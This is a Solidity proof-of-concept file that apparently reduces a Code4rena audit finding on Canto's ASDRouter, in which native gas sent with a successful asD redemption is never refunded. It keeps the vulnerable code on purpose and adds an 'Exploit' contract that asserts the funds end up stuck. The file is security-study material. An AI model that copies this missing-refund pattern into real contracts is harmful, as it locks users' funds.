// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Canto — Native gas tokens stuck in ASDRouter on successful asD redemption
    (Code4rena 2024-03-canto, finding #32129, H-01)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _sendASD on successful same-chain transfer uses 0 of msg.value
    and never refunds the remainder. Protocol invariant: ASDRouter native
    balance should always be zero. Vulnerable path preserved (@> VULN). */

struct OftComposeMessage {
    uint32 _dstLzEid;
    address _dstReceiver;
    address _cantoAsdAddress;
    address _cantoRefundAddress;
    uint256 _feeForSend;
}

/// @dev Minimal asD ERC20 (OFT stand-in).
contract MockASD {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Faithful reduction of ASDRouter._sendASD same-chain success path
///         (code-423n4/2024-03-canto contracts/asd/asdRouter.sol#L130-L167)
contract ASDRouter {
    uint32 public immutable cantoLzEID;
    event ASDSent(bytes32 guid, address receiver, address asd, uint256 amount, uint32 dstEid, bool local);

    constructor(uint32 cantoLzEID_) {
        cantoLzEID = cantoLzEID_;
    }

    /// @dev Public entry mimicking a successful lzCompose → _sendASD path for
    ///      same-chain delivery (dstEid == cantoLzEID).
    function sendOnCanto(bytes32 _guid, OftComposeMessage memory _payload, uint _amount) external payable {
        _sendASD(_guid, _payload, _amount);
    }

    function _sendASD(bytes32 _guid, OftComposeMessage memory _payload, uint _amount) internal {
        /* transfer the ASD tokens to the destination receiver */
        if (_payload._dstLzEid == cantoLzEID) {
            // just transfer the ASD tokens to the destination receiver
            // ...
            // FIX: if (address(this).balance > 0) payable(_payload._cantoRefundAddress).transfer(address(this).balance);
            MockASD(_payload._cantoAsdAddress).transfer(_payload._dstReceiver, _amount); // @> VULN: 0 of msg.value used; remainder never refunded
            emit ASDSent(_guid, _payload._dstReceiver, _payload._cantoAsdAddress, _amount, _payload._dstLzEid, false);
        } else {
            // cross-chain path (reduced): only feeForSend of msg.value is used
            if (msg.value < _payload._feeForSend) {
                // refund path omitted in success synthetic
                revert("insufficient msg.value for send fee");
            }
            (bool successfulSend, ) = payable(_payload._cantoAsdAddress).call{value: _payload._feeForSend}("");
            require(successfulSend, "send fail");
            emit ASDSent(_guid, _payload._dstReceiver, _payload._cantoAsdAddress, _amount, _payload._dstLzEid, true);
            // same missing-refund issue on cross-chain success when msg.value > feeForSend
        }
    }

    receive() external payable {}
}

contract Exploit {
    MockASD public asd; // CREATE nonce 1
    ASDRouter public router; // CREATE nonce 2 — vulnerable
    address public receiver; // CREATE nonce 3
    address public refund; // CREATE nonce 4

    uint32 public constant CANTO_EID = 1;
    uint256 public constant AMOUNT = 1000e18;
    uint256 public constant GAS = 1 ether;

    constructor() {
        asd = new MockASD();
        router = new ASDRouter(CANTO_EID);
        receiver = address(new Receiver());
        refund = address(new Receiver());

        // Router holds ASD to transfer on compose success.
        asd.mint(address(router), AMOUNT);
    }

    /// @notice Successful same-chain send with non-zero msg.value — native stuck.
    function run() external payable {
        uint256 available = address(this).balance;
        require(available >= GAS, "fund Exploit with GAS");

        OftComposeMessage memory payload = OftComposeMessage({
            _dstLzEid: CANTO_EID,
            _dstReceiver: receiver,
            _cantoAsdAddress: address(asd),
            _cantoRefundAddress: refund,
            _feeForSend: 0
        });

        uint256 routerBefore = address(router).balance;
        router.sendOnCanto{value: GAS}(bytes32(uint256(1)), payload, AMOUNT);

        // ASD delivered to receiver.
        require(asd.balanceOf(receiver) == AMOUNT, "asd not delivered");
        // HARM: native gas stuck on router; refund address got nothing.
        require(address(router).balance == routerBefore + GAS, "native not stuck on router");
        require(refund.balance == 0, "refund should not receive native");
        require(address(router).balance == GAS, "invariant broken: router native != 0");
    }

    receive() external payable {}
}

contract Receiver {
    receive() external payable {}
}
